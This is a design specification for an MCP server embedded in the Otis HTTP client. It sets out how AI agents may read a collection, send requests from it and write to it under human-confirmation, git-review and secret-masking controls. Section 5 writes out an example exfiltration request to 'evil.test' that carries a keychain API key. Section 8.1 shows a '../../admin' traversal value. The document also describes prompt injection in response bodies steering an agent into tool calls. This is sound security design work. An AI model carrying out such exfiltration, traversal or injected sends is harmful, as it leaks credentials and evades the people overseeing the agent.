# The MCP server

**Status: implemented.** It was written as a proposal first — to be approved,
rejected or argued with before any of it existed — because the feature can
send authenticated requests to production systems and the security design *is*
the feature rather than a wrapper around it. That is still how to read this
document: it is the specification, and the code follows it.

Two things moved between the proposal and the build, and both are marked where
they happen: §6.3's elicitation became SEP-2322's return-and-retry, because
mcp-go refuses server-initiated requests from protocol 2026-07-28; and §6.4
gained the rule that an in-app answer is the only thing that satisfies a
confirmation the window raised. §15's verification plan is the checklist the
tests were written against.

**One section is still a proposal: §8.1**, the SESSION capability and
`set_session_variable`. It is written the way the rest of this document was
written — to be argued with before it exists — and §15's items 33–36 are the
tests it does not have yet. Everything else here is built.

Read `VISION.md` §3 first. The line it draws under secrets is the constraint
everything here bends around.

---

## 1. What it is, and why it lives inside Otis

An MCP server that lets an agent — Claude Code, or anything else that speaks
the protocol — read a collection and, if you let it, send its requests and add
to it.

There are already MCP servers that wrap an HTTP client's CLI. This one is
**in-process**, inside the running app, and that is the whole point: it can
reach the things that only exist in a running Otis.

- **Session variables.** A value a post-response script set (`FORMAT.md` §4.5)
  lives in memory in the open collection and is in no file. A CLI wrapper
  starts a fresh process per call and cannot see it, so an agent driving one
  cannot do the thing people actually need — create a resource, then act on the
  id that came back. §8 shows that flow working.
- **The held response.** A response body stays in Go and is paged out a
  screenful at a time (`CLAUDE.md`). The agent reads it the same way, so a
  40 MB body does not become a 40 MB tool result.
- **A confirmation surface no client preference can switch off.** Elicitation
  (§6.3) is available to any MCP server, so "can ask a human" is not the
  advantage here. Being *the app* is: Otis can raise the question in its own
  window, which is the one place a client's "always allow this tool" cannot
  reach, and the only place it can put the diff of an unreviewed request next
  to the question (§5, §6.4).
- **One resolver.** The agent's send goes through the same resolve → prepare →
  send path as the Send button and `otis run`, so it cannot disagree with them
  about what a request means.

Library: **`github.com/mark3labs/mcp-go` v1.0.0** — `server.NewMCPServer`,
`mcp.NewTool`, `server.NewStreamableHTTPServer`.

## 2. Transport and authentication

**A loopback listener, `127.0.0.1` on an OS-assigned port, with a token minted
at startup.** Never `0.0.0.0`. Never a fixed port. Never a port without a
token.

The brief allowed serving this over the existing Wails asset server instead. It
will not work: that server answers a custom scheme inside the webview and is
not an HTTP endpoint another process on the machine can reach. So a listener it
is, and being a real listener it needs real defences:

| | |
| --- | --- |
| Bind | `127.0.0.1` only, explicitly — not `localhost`, which can resolve to a non-loopback address |
| Port | `0`, so the OS assigns one. Written to the config dir so a client can find it; changes every launch |
| Token | 32 bytes from `crypto/rand`, base64url. Minted when the server is enabled, never persisted |
| Every request | `Authorization: Bearer <token>`, compared with `crypto/subtle.ConstantTimeCompare` |
| `Origin` | Rejected unless absent or loopback. **This is the DNS-rebinding defence** and it is not optional: without it any web page you visit can drive this server through your browser |
| `Host` | Rejected unless loopback |

The token and port are written to `<config>/otis/mcp.json`, mode `0600`, and
the file is deleted when the server stops. That is how a client is configured:

```jsonc
// ~/.claude/mcp.json  (or equivalent)
{
  "otis": {
    "type": "http",
    "url": "http://127.0.0.1:<port>/mcp",
    "headers": { "Authorization": "Bearer <token>" }
  }
}
```

**Decided (§14.1): both stay unstable.** A port and token that change every
launch mean re-reading that file each time, and the alternative — a stable port
with a stored token — is a worse security posture for a marginal convenience.
`otis mcp config` prints the block above with the current values, which makes
the cost of an unstable endpoint one paste.

There is no `otis mcp serve`. The listener belongs to the app, because a
confirmation needs a window to appear in (§6.4); a headless MCP server would be
this design with its one safety removed. Asked for the endpoint with nothing
running, `otis mcp config` says the server is off and where to turn it on.

## 3. Capabilities: READ, RUN, WRITE and SESSION

Four switches. **All off by default, and the app ships with the server itself
off.**

| Capability | Grants | Default |
| --- | --- | --- |
| — | nothing; no listener at all | **off** |
| READ | `list_requests`, `get_request`, `list_environments`, `get_session_variables`, `get_last_response`, `get_test_results` | **off** |
| RUN | `send_request`, `run_folder` | **off** |
| WRITE | `create_request`, `create_folder`, `update_request` | **off** |
| SESSION | `set_session_variable` (§8.1) | **off** |

SESSION is its own switch rather than part of RUN, although chaining a flow is
what it is for. The reason is §8.1: a session value outranks the committed
layer it sits beside, so granting it is a different decision from granting
sends — and one you should be able to refuse while still letting an agent run
what the collection already contains.

RUN without READ is allowed and is not silly: an agent told exactly which
request to send does not need to enumerate the collection.

**WRITE requires the collection to be a git repository**, and the app refuses
to enable it otherwise. The mechanism that makes WRITE safe is §5's review
gate, and that gate is `git status`; with no git there is no notion of
reviewed and therefore no gate. READ and RUN are unaffected — a collection is
a directory of files and works perfectly well outside version control
(`CLAUDE.md`), it just cannot host an agent that writes.

Enabling any of them is a click in the app, per-machine, and persisted in
`settings.json` under a new `mcp` key — never in the collection. Whether *you*
let an agent drive your machine is not a fact about the repository, and a
committed switch would be one person deciding it for the whole team.

```jsonc
"mcp": {
  "read": false,
  "run": false,
  "write": false,
  "session": false,
  // §4 rule 4: tightens the committed per-environment policy, never loosens it.
  "alwaysConfirmSends": true,
  // §9.1. On by default; false keeps the session's calls in memory only.
  "persistAuditLog": true
}
```

**Turning RUN on does not grant sending, and turning WRITE on does not grant
sending what was written.** It grants the *tool*. Whether a
given call proceeds is §4, §5 and §6.

## 4. Per-environment policy

An environment carries its own agent policy, committed, under the reserved
`$otis` key `FORMAT.md` §4.3 already defines. This extends that section:

```json
{
  "$otis": {
    "description": "production",
    "confirmBeforeSend": true,
    "agents": "deny"
  },
  "baseUrl": "https://api.acme.com"
}
```

`agents` takes three values:

| Value | Meaning |
| --- | --- |
| `"deny"` | No agent may send against this environment. The tool refuses and says why |
| `"confirm"` | Every call needs an in-app confirmation. **The default** |
| `"allow"` | Calls proceed without asking |

Committed, deliberately, for the same reason `confirmBeforeSend` is: whether an
environment is the dangerous one is a fact about the environment, the whole
team should get the same answer, a fresh clone should get it without
configuring anything, and weakening it should show up in review.

Three rules make the defaults safe:

1. **The default is `confirm`, not `allow`.** An environment that says nothing
   gets a human in the loop. Opting *out* is the deliberate act.
2. **`confirmBeforeSend: true` forces at least `confirm`, and `"allow"` beside
   it is an error naming the file.** That flag is the committed marker of "this
   is production". An agent policy that could downgrade it would let a
   convenience setting quietly cancel a safety one.
3. **No environment selected is treated as `confirm`.** With no environment
   there is no way to reason about where a request points, and a request may
   carry a literal URL.

4. **A per-machine setting can tighten this, never loosen it.** `settings.json`
   carries `mcp.alwaysConfirmSends`, **on by default** (§14.12). **Every** agent
   send asks, including against an environment marked `"allow"`, until somebody
   turns it off.

   It decides *whether* a person is asked, not *where*: the surface is §6.3 and
   §6.4's business. That separation matters now that it defaults on — see the
   note under §6.4.

   It exists because `agents` is *committed*: somebody on the team decided that
   `local` is safe for agents, and you may not agree on your machine — or may
   not have read the environment file at all. Tightening is always yours to do
   unilaterally. Loosening is not: there is deliberately no per-machine setting
   that turns a `"confirm"` or `"deny"` environment into an `"allow"` one,
   because that is the one direction where a local preference could quietly
   cancel a decision the team made in review.

   The effective policy is therefore the **stricter** of the committed one and
   the local one, computed in one place so no caller can get it wrong.

Unknown values are an error naming the key, not a silent fallback — `"agents":
"alow"` must not read as permission.

## 5. The review gate: git decides what is trusted

WRITE and RUN together are the dangerous combination, and not for the obvious
reason. An agent that can write a file can write this one:

```
POST https://evil.test/collect
Authorization: Bearer {{apiKey}}
```

It never *sees* the secret — §7 holds to the letter — but it chose where the
secret goes. That would defeat the point of §7 while satisfying its wording,
and it would dissolve the boundary that makes the rest of this document mean
anything: that an agent can only send what somebody reviewed.

So the boundary is not "an agent cannot compose a request". It is:

> **A request file that git does not report as clean is unreviewed.** Sending
> an unreviewed request always requires confirmation in Otis' own window,
> whatever the environment policy says. When it would also consume a secret,
> that confirmation is the **danger** variant described below.

Clean means git reports no difference from `HEAD` for that path. Untracked
counts as unreviewed. **Staged-but-uncommitted also counts as unreviewed**,
because `HEAD` is what was reviewed and staging is something you do *before*
reading the diff.

Why this is better than anything policy-based:

- It is **not trust**. `internal/git` already reports per-path status — it is
  what draws the tree's dots — so this is enforced by the same fact the UI
  already shows, not by a flag an agent or a setting could relax.
- **`"allow"` cannot override it.** An environment marked `"allow"` still
  confirms an unreviewed send. The two gates are independent and both must
  pass.
- **It puts a person in front of exfiltration**, which is the most it does.
  An agent that writes `Authorization: Bearer {{apiKey}}` pointed at a host it
  chose gets a dialog, not a send. It does *not* close the path: see §5.1 and
  §13, and understand this as the residual risk of the design rather than a
  solved problem.
- **It applies to your own edits too**, which is the right answer rather than a
  side effect: a request you have half-rewritten is not one an agent should
  send without asking.
- **An agent's writes surface where your own do** — the tree's `M` and `U`
  dots, the status bar's count, the diff view. No new indicator is needed
  because a write by an agent is a change to the working tree like any other,
  and `⌘G` shows exactly what it did.

### 5.1 The danger confirmation

An unreviewed send that would consume a secret is the one case where a mistaken
click cannot be taken back — the credential is on the wire and gone. It is
confirmed rather than refused (§14.7), so the confirmation has to carry the
weight the refusal would have:

- **In Otis' window, always** (§6.4). Never answerable through the client.
- **The destructive treatment.** `--border-danger`, which `DESIGN-NOTES` §2.2
  reserves for the "Discard changes…" button *only* — the one other action in
  Otis that destroys something git cannot get back. This dialog is the second,
  and giving it the same border is the design's existing way of saying so. The
  text and the button take `#f87171`, the destructive colour of §2.6, with the
  caveat §9.3 records about that hex carrying four meanings.
- **The diff is in the dialog.** The request is unreviewed, so there *is* a
  diff, and showing it is the whole point: what the agent wrote is the thing
  being approved. This is what the window can do and a client prompt cannot,
  and it is why case 2 of §6.4 exists.
- **The button names the destination.** *"Send to `evil.test`"*, not *"Send"*.
  Muscle memory cannot approve a host it has to read, and the host is the one
  fact that distinguishes an exfiltration attempt from ordinary work.
- **It names the secret.** "Sends `apiKey` from the keychain."
- **Refuse is focused**, and the timeout refuses. Nothing here proceeds by
  inattention.

Honestly: this is a dialog, and §13 says plainly that a dialog is only as good
as its reading. The design has moved a flat refusal to an informed decision,
which is a real reduction in safety bought for a real gain in usefulness — an
agent can now iterate on a request that needs a credential. Decision §14.7 is
where that trade was made, and it is the one to revisit first if this ever
goes wrong.

The `⌘G` point above is why the audit log (§9) does not record file contents: git
already has them, in more detail and with a diff.

## 6. The consent model

**Every send that needs confirmation gets its own confirmation, from a person.
There is no session-wide approval, no "allow for 10 minutes", and no "always
allow".** Everything below is about *where* that person is asked, never about
whether.

### 6.1 What the tools declare, and why that is not a gate

Every tool carries MCP annotations, which mcp-go exposes as tool options:

| Tool group | |
| --- | --- |
| READ | `WithReadOnlyHintAnnotation(true)` |
| WRITE | `WithReadOnlyHintAnnotation(false)`, `WithDestructiveHintAnnotation(false)`, `WithIdempotentHintAnnotation(false)` |
| RUN | `WithReadOnlyHintAnnotation(false)`, `WithDestructiveHintAnnotation(true)`, `WithOpenWorldHintAnnotation(true)` |

`destructiveHint` on `send_request` is honest: Otis cannot know what an endpoint
does, and a request in a reviewed collection may well delete something.
`openWorldHint` is honest for the same reason — the effect leaves the machine.

These are worth setting because a good client uses them to decide what to
prompt about. **They are not the gate**, and the reason is specific: they are
*hints*, the client decides what to do with them, and real clients offer
"always allow this tool". One click on that — plausibly made while approving a
harmless `list_requests` — would silently delete the per-send confirmation this
section exists to guarantee. A safety property that a client-side preference can
switch off is not one Otis can claim.

### 6.2 Two-phase send: nothing sends on one tool call

**Every send is two-phase, on every client, always.** `send_request` and
`run_folder` called without an `intent` describe what would happen and send
nothing; called with the intent handed back, they proceed to §6.3.

```jsonc
// Phase 1 — nothing is sent, and nobody is asked.
→ send_request { "path": "orders/create-order.http" }
← { "intent": "i_7f2a…", "expiresAt": "2026-09-04T11:03:41Z",
    "method": "POST",
    "resolvedUrl": "https://api.acme.com/v2/orders",
    "environment": "production",
    "usesSecret": true, "secrets": ["apiKey"],
    "reviewed": true,
    "willAsk": "the person, in Otis' window — production confirms before send" }

// Phase 2 — the intent handed back. Now the person is asked (§6.3, §6.4).
→ send_request { "path": "orders/create-order.http", "intent": "i_7f2a…" }
← { "sendId": "s_7f2b", "status": 201, … }
```

What it is for:

- **There is no code path in which a single tool call sends anything.** That is
  the whole property, it is worth more than the round trip it costs, and being
  universal is what makes it a property rather than a configuration. A gate
  that exists only for some clients is a gate you have to reason about per
  client.
- **A single stray tool call cannot send.** If an agent is talked into one call
  — by a prompt injection in a response body, say (§13) — that call is a
  preview.
- **The resolved target lands in the agent's context before the send**, and so
  in the transcript a person may be reading. A send somewhere surprising is
  visible in the conversation and not only in the audit log.

The intent is **single-use**, expires in **60 seconds**, and is bound to a
**fingerprint of the resolved request**: method, URL, headers, body,
environment, and the session values it consumed. If anything changes between
the phases the intent is void and the agent must preview again.

Without that binding two phases would be a hole rather than a gate — preview
something harmless, edit it with `update_request`, then spend the intent on
what the preview never described. With WRITE enabled that is not hypothetical,
which is why the fingerprint covers the body and not just the URL.

**Two phases are not consent.** An agent will echo an intent back without a
thought; anything it can be talked into once it can be talked into twice.
Phase 2 is where a person is asked, and an implementation in which a returned
intent skipped that would be a bug of the worst kind.

`run_folder` takes one intent for the run, because the plan is what was
previewed. The person is still asked **per request** (§6.5).

### 6.3 Asking through the client — the everyday surface

At phase 2, for a send that needs confirming, the handler asks the person
through their own client, using MCP elicitation.

> **Corrected during implementation.** This section described a *blocking*
> ask: the handler calls `RequestElicitation` and waits. From protocol version
> **2026-07-28** that no longer exists — server-initiated requests were
> replaced by multi round-trip requests (SEP-2322), and `mcp-go` refuses the
> old call with "server-initiated requests are not supported in protocol
> version 2026-07-28 or later". The design was written against the older
> mechanism and had to change; what follows is what is built.

The handler **returns** the question rather than waiting for it. A tool call
that needs a confirmation answers with `ResultTypeInputRequired` and the
elicitation it needs; the client collects the answer and **retries the same
tool call** with the answer in `inputResponses`:

```go
// The retry carries the answer, so a handler detects it first.
if answer := server.ElicitationResponse(req.Params.InputResponses, "otis.confirm"); answer != nil {
    // accept | decline | cancel. An accept whose `proceed` is false is a no.
}
// Otherwise: ask, and return.
return server.NewInputRequestBuilder(intentID).
    Elicit("otis.confirm", mcp.ElicitationParams{ /* message, one boolean */ }).
    ToolResult()
```

`mcp-go` bridges clients on an older protocol by performing the
server-initiated call on their behalf and re-invoking the handler, so one
handler serves both eras and no client is left out.

Three consequences, all of them improvements except the last:

- **No tool call blocks for a minute.** The old shape held a call open for up
  to 60 seconds; this returns immediately and the retry arrives when the person
  has answered. A call that hangs is worse for an agent than one that comes
  back.
- **The handler has to be resumable**, because it runs again from the top. That
  is why an intent is *verified* on the way in and only **spent** at the send
  (`Intents.Verify` / `Intents.Redeem`): spending it on the first pass would
  leave the retry with nothing to spend. Verify still voids the intent on any
  failure, so the rule that a stale fingerprint cannot be retried is unchanged.
- **The 60-second bound moves.** It still bounds Otis' own dialog directly. On
  the client surface it is the intent's TTL that bounds it — the same 60
  seconds — so an answer that arrives too late finds nothing to spend and the
  agent is told to preview again.

Used only when the client declared `ClientCapabilities.Elicitation` in its
handshake. A client that did not is not given a weaker gate — it is simply not
asked *there*, and §6.4's window becomes the only place a person can answer at
all.

This is the right default surface, because the person is *already looking at
the client*. Making them alt-tab to Otis to approve a send the agent proposed
in a conversation they are reading is worse in every way except one, which is
§6.4.

`decline` and `cancel` are both refusals and are logged distinctly, because
"the person said no" and "the prompt went away" are different facts and only
one of them means they saw it.

### 6.4 Asking in the window — the authority

**Two cases must be answered in Otis' own window, and elicitation only points
at it:**

1. The environment sets `confirmBeforeSend: true` — production. The brief this
   was written from asks for an "explicit in-app confirmation" here, and it is
   right to: this is the case where a misconfigured or over-permissive client
   is catastrophic rather than annoying.
2. The send is **unreviewed** (§5) — an untracked or modified file. Otis' own
   dialog is where the diff is, one keystroke away.
Note what is **not** on this list. An earlier draft had a third case —
`mcp.alwaysConfirmSends` — justified on the grounds that turning it on was a
deliberate statement that you wanted to be asked *by Otis*. Deciding to default
it on (§14.12) removed that justification: a setting nobody chose is not a
statement anybody made, and keeping the case would have meant every send was
window-only out of the box, which would leave §6.3's elicitation unreachable
unless a person went and *weakened* a safety setting to get a better prompt.
That is an incoherent shape for a default, so the setting now decides whether a
person is asked and these two cases decide where.

For the two cases above the elicitation message is a notification — "Otis is waiting for your
confirmation" — and the answer is only taken from the window. It costs a
context switch exactly where a context switch is cheap relative to the mistake.

Everything else — the default `"confirm"` on an ordinary environment — is asked
**through the client when the client can be asked, and in the window when it
cannot.**

> **Corrected during implementation.** This said "may be answered in either
> place, and the first answer wins", which assumed both surfaces could be
> opened at once and raced. They cannot, for the reason §6.3 now records: the
> client's question is a *return* from the tool call and the window's dialog is
> a *block* inside it. One surface returns and the other waits; there is no
> shape in which both are live. Preferring the client is §6.3's own argument —
> the person is already looking at it — and the window is the fallback when the
> client cannot ask, which is the case that mattered anyway.
>
> Nothing is loosened by this. The two window-only cases above are unaffected,
> and the surface actually used is recorded in the audit log either way (§9).

One further consequence, in `run_folder`: a folder run is a loop inside a
single tool call, so its per-request confirmations are asked **in Otis' window
only**, whatever surface the policy would otherwise allow. Returning from the
middle of the loop to ask the client would abandon the requests already sent.
This is a mechanical constraint and not a policy difference — each request is
still decided on its own, and the window is the stricter of the two surfaces.
§6.5 already says a folder run against a confirming environment is impractical
from an agent, "which is correct"; this is where that bites, and the plan's
`confirmations` count is what tells an agent so before it starts.

The flow at phase 2, in both surfaces:

1. The handler re-resolves the request and checks the intent's fingerprint
   still matches, so what the person is shown is what will actually be sent.
2. It asks, and **blocks**.
3. The prompt names the client, the tool, the method, the resolved URL, the
   environment and whether a secret is involved. Not "allow?" — the whole value
   of a confirmation is in what it says.
4. The person answers. A refusal returns an error the agent can read. No answer
   within **60 seconds** is a refusal: an agent must not be able to leave a
   dialog up indefinitely, and a call that hangs forever is worse for the agent
   than one that fails.
5. Only then does the send happen.

The gate itself lives where the existing one lives — `send-context`, which
already holds the `confirmBeforeSend` gate for the Send button, ⌘↵, the palette
and folder runs, on the argument that "a safety feature with a hole in it is not
one". An agent send is one more caller and must not get its own path. What is
new is only that this caller can be asked in two places.

### 6.5 Consequences worth stating plainly

- An agent cannot batch approvals. Ten sends against a `confirm` environment
  are ten prompts. That is the intended friction; if it is too much the answer
  is `"allow"` on a safe environment, not a weaker gate.
- `run_folder` asks **once per request**, not once for the folder. A folder run
  is N sends and the policy is per send, so a twenty-request folder is
  impractical to run against production from an agent — which is correct.
- If Otis has no window open, or no collection, a call needing a §6.4
  confirmation fails. There is nobody to ask.
- A client that supports elicitation and a person who ignores the prompt reach
  the same place as a refusal, after 60 seconds. Nothing proceeds by default.

## 7. Secrets

**An agent can cause a request to be sent using a keychain secret, and never
receives the value.** This follows `VISION.md` §3 with no new machinery,
because the machinery is already there.

- Resolution runs as it does for any send. The value reaches the wire and
  nothing else.
- Every tool result is passed through **the request's own masker**
  (`resolve.Resolved.Mask`), which replaces every secret value the request used
  with `•••••`. Same function the logs and the window use.
- **Response bodies are masked too, and that matters.** A server that echoes
  your `Authorization` header — httpbin does; so do plenty of debug endpoints —
  would otherwise hand the agent the credential it was never given. The masker
  already registers the values used by the request, so it catches them coming
  back. This is the single most important line in this document to get right,
  and §15 tests it directly.
- `list_environments` reports that a variable **is** a secret and never its
  value, exactly as `EnvironmentRow` does for the window.
- `get_session_variables` marks a session value secret if it came from one, and
  withholds it.
- No tool takes a secret as an argument. There is no way for an agent to set
  one, and no tool writes to the keychain.

## 8. Session state: the multi-step flow

This is the capability a CLI wrapper cannot offer, so here it is end to end.
Given `orders/create-order.http` with a post-response script:

```
> {% vars.session.set("orderId", response.body.id) %}
```

and `orders/get-order.http` whose URL is `{{baseUrl}}/orders/{{orderId}}`:

```jsonc
// 1. The agent sends the first request.
→ send_request { "path": "orders/create-order.http" }
← { "status": 201, "sendId": "s_7f2a",
    "tests": { "passed": 2, "failed": 0 },
    "sessionVariablesSet": [
      { "name": "orderId", "scope": "folder", "owner": "orders" }
    ] }

// The value is NOT in that result. It is in Otis' session store, and the
// agent is told a variable was set rather than what it is — the same way a
// person sees the Variables panel gain a row.

// 2. The agent can look, if READ is on.
→ get_session_variables { "folder": "orders" }
← { "variables": [
      { "name": "orderId", "value": "ord_01H9Z", "scope": "folder",
        "owner": "orders", "setBy": "orders/create-order.http",
        "at": "2026-09-04T11:02:41Z", "secret": false } ] }

// 3. And the second request resolves {{orderId}} from it, with no argument
//    passed and nothing written to any file.
→ send_request { "path": "orders/get-order.http" }
← { "status": 200, "sendId": "s_7f2b",
    "resolvedUrl": "https://api.acme.dev/orders/ord_01H9Z" }
```

Step 3 is the point. The agent did not carry the id between calls, did not
write it to a file, and could not have — the value exists only in the running
app's memory, and it will be gone when the collection closes.

Two properties this inherits from `FORMAT.md` §4.5 and must keep: a session
value is **literal**, so a `{{` arriving in a response cannot reach into the
variable scope; and it is **written nowhere**, so an agent cannot use the
session store as a way to leave state behind.

### 8.1 Writing one: `set_session_variable`

§8 chains a flow without the agent ever writing a variable — a reviewed
post-response script sets it and the next send resolves it. That covers the
common case and should stay the default way to build a flow. `set_session_variable`
is for the case it does not cover: a value the *agent* chooses, in a flow it is
assembling, where no committed script sets one yet.

It is the most carefully gated tool in this document, and the reason is the
resolution order rather than anything about the value itself.

**Why a session write is not a small thing.** `FORMAT.md` §4.2 interleaves the
session layer with the committed one: nearest definition wins, and at one level
**a session value beats the file**. Step 3 puts the session value for the
active environment ahead of the environment. So an unconstrained
`set_session_variable` is an *environment override with no file* — and §12
already refuses environment writes. Concretely, a request the team committed
months ago:

```
GET {{apiHost}}/v1/orders
Authorization: Bearer {{apiKey}}      # inherited from _folder.http
```

is clean, reviewed, and sends under the environment's policy with nobody
watching. An agent that could set a session `apiHost` would redirect it to a
host of its choosing, **and §5 would never fire**, because §5 asks "is this
file unreviewed?" and answers with `git status`. Nothing in the tree changed.
That is §5's own opening scenario reached without writing a file.

So the tool exists under three rules, in this order.

**Rule 1 — it may not shadow anything.** A set is **refused** when the name
already resolves at the target folder through any committed scope: a `@var` in
a request file, a `@var` in any `_folder.http` at or above it, or the active
environment. The refusal names what it would have shadowed
(`"apiHost" is defined by env/staging.json; a session value would override it`).

This is a rule and not a dialog, deliberately. §13 says a dialog is only as
good as its reading, and this is the case where a misread has no floor under
it. It also costs the legitimate use almost nothing: a flow sets `orderId`,
`sessionToken`, `createdAt` — names the collection does not otherwise define.
A flow that needs to change `apiHost` is not a flow, it is a configuration
change, and `VISION.md` §5 says configuration belongs somewhere reviewable.

The check runs at **redeem**, against the scope as it stands then, not at
preview. A name that became defined in between is refused.

**Rule 2 — a person authorizes it, always.** In Otis' own window, never
answerable through the client (§6.4). Not subject to the environment's policy
and not skipped by `"allow"`, for a reason that falls out of §5:

> A session value is in no file. git cannot vouch for it. It is therefore
> **permanently unreviewed** — and §5's rule is that sending anything
> unreviewed asks a person. Setting one is the same fact one step earlier.

`"deny"` on the active environment refuses without a dialog, as everywhere.

The dialog names the folder, the variable, the value it would take (capped at
256 characters, and it is the agent's own data rather than anything from the
keychain — no secret can reach here, see rule 3), and **which requests below
would resolve it**, because that is the blast radius and Otis already computes
it for the folder view's "inherited by N requests".

**Rule 3 — no secrets, in either direction.** A session variable set through
this tool is never marked secret and never reads one: the value is a literal
the agent supplied. The masker still runs over the result, as it does over
every result (§7). And `get_session_variables` continues to withhold the value
of anything marked secret, which only a script can produce.

**Two-phase, like every other mutating tool** (§6.2). Phase 1 previews: the
folder, the name, the value, what it would shadow (which is what turns a
refusal into something the agent can act on before spending a turn), and the
requests it would reach. Phase 2 redeems the intent and asks the person. The
fingerprint covers folder, name and value, length-prefixed, so an agent cannot
preview `orderId` and redeem `apiHost`. An intent is single-use and is spent on
every outcome, including a refusal under rule 1.

**Audited** (§9) as `set_session_variable`, with the variable's name and scope
as the `target` and the decision. **Never the value** — `mcp.Entry` has nowhere
to put one, and that is a property of the type rather than a habit.

```jsonc
// Phase 1: nothing is set.
→ set_session_variable { "folder": "orders", "name": "orderId", "value": "ord_TEST_1" }
← { "intent": "i_9c31", "folder": "orders", "name": "orderId",
    "shadows": null, "reaches": 6,
    "note": "Not set. Call again with the intent to ask for authorization." }

// Phase 2: a person is asked, in Otis' window.
→ set_session_variable { "intent": "i_9c31", ... }
← { "set": true, "folder": "orders", "name": "orderId", "scope": "folder" }

// Rule 1, at any phase:
← error: "apiHost" is defined by env/staging.json; a session value would
         override it. Set it there, or use a name the collection does not define.
```

**What this still does not close.** The value is substituted into a reviewed
request, and substitution is not free of consequence: `orderId` set to
`../../admin` turns `{{baseUrl}}/orders/{{orderId}}` into `{{baseUrl}}/admin`.
Rule 1 bounds that to the host and the credential the reviewed request already
uses — it is the API's own authorization deciding, not Otis' — and the person
who authorized the set saw the value. It is a smaller risk than the redirect
rule 1 removes, and it is not zero. §13 is where the residual risks live and
this belongs on that list.

## 9. The audit log

Every tool call is recorded, whatever the outcome:

| Field | |
| --- | --- |
| `at` | when, RFC 3339 in UTC |
| `collection` | which collection was open. Without it a log spanning two collections is ambiguous about which `orders/create-order.http` was touched |
| `tool` | which tool |
| `target` | the request or folder node path |
| `environment` | the environment name, or `""` |
| `surface` | `client` or `window` — **where the person was asked**, which is the field that shows §6.4 was honoured |
| `decision` | `allowed` · `confirmed` · `refused` · `denied-by-policy` · `timed-out` · `rate-limited` · `asked` |
| `status` | the HTTP status, the failure kind, or `created` / `modified` for a write |
| `durationMs` | how long it took, in milliseconds. The unit is in the name because a bare `duration` in a log two years old is a number you have to go and find the code for |
| `client` | the MCP client's declared name and version |

`asked` is the one added during implementation: a confirmation through the
client is a round trip (§6.3), so the call that *asks* returns before the
answer exists. Without a line for it, an agent putting prompts in front of
somebody who never answers would leave no trace in the log at all. The answer,
when it comes, produces its own line with the surface it came from.

**What is deliberately not in it:** no request body, no response body, no
headers, no secret value, no session variable value, and **no file contents for
a write**. An audit log is a record of *what was done*, and one that quoted
payloads would become the thing you have to protect.

For writes that division is not a compromise but the right split: git already
holds what changed, in more detail and with a diff, and `⌘G` shows it. The
audit log says *that* the agent touched `orders/create-order.http` at 11:02;
the diff view says what it did to it.

Inspectable from the UI: a panel listing the calls, newest first, with the
in-app indicator (§11) as its way in.

### 9.1 It is a file

Appended to **`<config>/otis/mcp-audit.jsonl`**, one JSON object per line,
beside `settings.json` and the secret key index. On by default; a
`mcp.persistAuditLog: false` turns it off and keeps the session's calls in
memory only.

A file rather than a session buffer because a readout you lose on quit answers
"what is this agent doing" but not "what did it do last Tuesday", and the
second is the question an audit log exists for.

Five things about it that are not incidental:

- **It is never in the collection.** The config directory, not the repository.
  A log inside the collection would be committed, and then everybody on the
  branch would have a record of which endpoints you called from your machine.
  This is the same reasoning that keeps the active environment out of the
  collection (`FORMAT.md` §4.3).
- **Mode `0600`.** It records your infrastructure's shape — hostnames, paths,
  which environments exist. That is not secret but it is not public either.
- **It is capped.** 5 MB, then rotated once to `mcp-audit.jsonl.1` and the old
  one dropped. Unbounded growth in a file nobody looks at is how you find a
  gigabyte of JSON in a config directory two years later.
- **JSONL, not JSON**, so appending is a write with no read-modify-write, a
  truncated last line from a crash costs one entry rather than the file, and
  `grep` and `jq` work on it.
- **What is in it is asserted by a test.** The secret key index next door
  "holds keys and nothing else; a test asserts it" (`CLAUDE.md`), and this file
  gets the same treatment: a test drives every tool, with secrets and bodies
  in play, and fails if any secret value, request body, response body, header
  or file content reaches a line.

**A log that cannot be written does not stop the call.** `Record` returns the
file error and the entry stays in the in-memory list; the failure surfaces on
the indicator (§11) rather than failing the tool. A config directory that has
become unwritable must not stop Otis working, and the alternative — "no audit,
no action" — trades a tool that works for a guarantee this log does not
otherwise make, since `persistAuditLog: false` already allows a session with no
file at all. Anything wanting that guarantee has to build it deliberately.

The privacy trade, stated rather than buried: **turning Otis' MCP server on now
also starts a durable record of which endpoints you asked an agent to call.**
That is the point of an audit log, and it is a new artifact that did not exist
before. The switch to turn it off exists for that reason and not as an
afterthought.

## 10. Rate limiting and the kill switch

**Rate limits**, per capability, token bucket:

| | Sustained | Burst |
| --- | --- | --- |
| READ | 10/s | 30 |
| RUN | 1/s | 5 |
| WRITE | 2/s | 10 |
| SESSION | 1/s | 5 |

WRITE is limited more loosely than RUN because a write is recoverable and a
send is not — but it is limited at all, because an agent in a loop creating
files is a mess someone has to clean up by hand.

A call needing confirmation consumes its budget when it is *approved*, not when
it is asked. Otherwise an agent could exhaust the bucket with calls a person
refuses, and refusing would cost the person their own next send.

Exceeding a limit returns an MCP error and is logged as `rate-limited`. The
limits are per running app, not per client.

**The kill switch.** One control, in the indicator's popover and in the
palette: *Disconnect agents*.

1. The token is revoked immediately, so the next call fails authentication.
2. In-flight tool calls are cancelled, including sends already on the wire —
   the same cancellation `SendService.Cancel` already does.
3. The listener closes and `mcp.json` is deleted.
4. Both capabilities flip off, so a reconnect is not enough; re-enabling is a
   deliberate act.

A new token is minted next time the server is enabled. There is no way to get
the old one back.

## 11. The in-app indicator

**When the server is enabled, the title strip carries a chip; when a client is
actually connected, the chip is live.** The design does not draw one, so the
visual decision is written up as `DESIGN-NOTES` §9.22 (§14.3, decided: the
title strip, in amber). Its content was never in doubt:

- Off: nothing at all. A feature that is off should not occupy the chrome.
- Enabled, nothing connected: `agent · idle`, in `--fg-dim`.
- Connected: `agent · <client name>` with a live dot, and **the accent is not
  the right colour for it** — the accent means "good" in this design (§2.4),
  and an agent holding your credentials is a state to be aware of, not a
  success. Amber (`--modified`) is the closer reading.
- A confirmation waiting: the chip counts it.

Clicking it opens a popover with the two capability switches, the connected
client, the audit log, and *Disconnect agents*.

The status bar's right slot already carries the current view's context and is
not a good home: this is app state, not view state, and it must be visible on
every screen including the diff and the empty state.

## 12. Tool surface

Refined from the brief. Every result is masked (§7). Every path is a
collection-relative node path (`FORMAT.md` §2.1). Every tool carries the
annotations §6.1 lists.

### READ

**`list_requests`** — the collection as a tree.
`{ folder?: string, includeFolders?: boolean }` →
`{ requests: [{ path, name, method, folder }], folders: [...] }`
The same tree the sidebar draws and `otis ls` prints.

